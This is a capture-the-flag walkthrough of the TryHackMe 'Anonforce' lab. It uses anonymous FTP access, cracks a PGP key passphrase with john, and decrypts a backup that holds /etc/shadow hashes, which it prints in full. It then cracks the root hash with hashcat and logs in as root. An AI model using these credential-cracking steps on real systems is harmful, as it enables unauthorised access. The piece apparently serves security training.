| ![Anonforce](/Assets/Images/anonforce.png) | <br><br>Name - Anonforce<br>Difficulty - Easy<br>Type - Linux |
| :----------------------------------------- | :------------------------------------------------------------ |

Link - "https://tryhackme.com/room/bsidesgtanonforce"

```
echo 'MACHINE_IP anonforce.thm' | sudo tee -a /etc/hosts
```

# ⚝ Enumeration

**Nmap Scan Result -** 

```
$ nmap -sCV -p- anonforce.thm

Nmap scan report for anonforce.thm (10.80.129.180)
Host is up (0.014s latency).
Not shown: 65533 closed tcp ports (conn-refused)

PORT   STATE SERVICE VERSION

21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
| drwxr-xr-x   17 0        0            3700 May 20 04:37 dev
| drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
| drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
| drwx------    2 0        0           16384 Aug 11  2019 lost+found
| drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
| drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
| drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
| dr-xr-xr-x   94 0        0               0 May 20 04:37 proc
| drwx------    3 0        0            4096 Aug 11  2019 root
| drwxr-xr-x   18 0        0             540 May 20 04:37 run
| drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
| dr-xr-xr-x   13 0        0               0 May 20 04:37 sys
|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.232.30
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status

22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA)
|   256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA)
|_  256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

From the above scan we got two open ports `21(ftp)` and `22(ssh)`. The main thing to notice here is that `Anonymous FTP login allowed`.

# ⚝ Exploitation - Initial Access

Let's login and get some more information. We don't need any password just press `Enter` for that.

**ftp ( Anonymous Login ) -** 

```shell
$ ftp Anonymous@anonforce.thm

Connected to anonforce.thm.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
drwxr-xr-x   17 0        0            3700 May 20 04:37 dev
drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
drwx------    2 0        0           16384 Aug 11  2019 lost+found
drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread
drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
dr-xr-xr-x   92 0        0               0 May 20 04:37 proc
drwx------    3 0        0            4096 Aug 11  2019 root
drwxr-xr-x   18 0        0             540 May 20 04:37 run
drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
dr-xr-xr-x   13 0        0               0 May 20 04:37 sys
drwxrwxrwt    9 0        0            4096 May 20 04:37 tmp
drwxr-xr-x   10 0        0            4096 Aug 11  2019 usr
drwxr-xr-x   11 0        0            4096 Aug 11  2019 var
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
226 Directory send OK.
ftp> 
```

We can find our user flag in `/home/melodias` directory.

```
ftp> pwd
257 "/home/melodias" is the current directory
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000           33 Aug 11  2019 user.txt
226 Directory send OK.
ftp> cat user.txt
?Invalid command
ftp> 
```

Ahh, we can't simply run `cat` command here, it's not like a normal shell. Let's see what commands we can run by using the `help` command.

```
ftp> help
Commands may be abbreviated.  Commands are:

!		dir		macdef		proxy		site
$		disconnect	mdelete		sendport	size
account		epsv4		mdir		put		status
append		form		mget		pwd		struct
ascii		get		mkdir		quit		system
bell		glob		mls		quote		sunique
binary		hash		mode		recv		tenex
bye		help		modtime		reget		trace
case		idle		mput		rstatus		type
cd		image		newer		rhelp		user
cdup		ipany		nmap		rename		umask
chmod		ipv4		nlist		reset		verbose
close		ipv6		ntrans		restart		?
cr		lcd		open		rmdir
delete		lpwd		passive		runique
debug		ls		prompt		send
ftp> 

```

We can use the `get` command to download the `user.txt` file locally and read. We got our first flag now let's try to grab the second flag.

# ⚝ Privilege Escalation

If we check our previous file listing inside `/`, we can find a directory named `notread`. Let's check why ...

```
ftp> cd notread
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||25238|)
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
226 Directory send OK.
ftp> 
```

Nice, We can find an encrypted file and also the key. PGP stands for 'Pretty Good Privacy'.

Let's get these files and first target the key `private.asc`. I converted the private key file into john(JohnTheRipper) crackable format.

```shell
gpg2john private.asc > hash
```

Next, used `john` to crack it using it's default dictionary.

```shell
john hash
```

`xbox360` is the cracked output. Now let's use this to read the content from `backup.pgp`.

```shell

$ gpg --decrypt backup.pgp 
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12
      "anonforce <melodias@anonforce.nsa>"
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18120:0:99999:7:::
uuidd:*:18120:0:99999:7:::
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
sshd:*:18120:0:99999:7:::
ftp:*:18120:0:99999:7:::
```

If you face any error, import the `private.asc` first and then decrypt command. For example - 

```
First:
$ gpg --import private.asc

Second:
$ gpg --decrypt backup.pgp
```

Back to the challenge, We got some interesting data here. A username and it's password hash.
`root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0`

I saved the above data in a file called `crack_hash` and used `hashcat` to crack it.

`hashcat -m 1800 -a 0 crack_hash /usr/share/wordlists/rockyou.txt --username`

Notes:
- I used `--username` flag to process the identifier properly.
- We can get the info about the `hash-mode or -m` from "https://hashcat.net/wiki/doku.php?id=example_hashes". The above hash starts with `$6$` which matches `sha512crypt $6$, SHA512 (Unix)` and mode `1800`.

I got `hikari` as cracked password for `root` user. Let's login as `root` and grab our final flag.

I got the root shell using `ssh root@anonforce.thm` command with `hikari` as password.

We can find our root flag inside `/root`.

```shell
root@ubuntu:~# pwd
/root
root@ubuntu:~# ls
root.txt
```


! Happy Hacking !
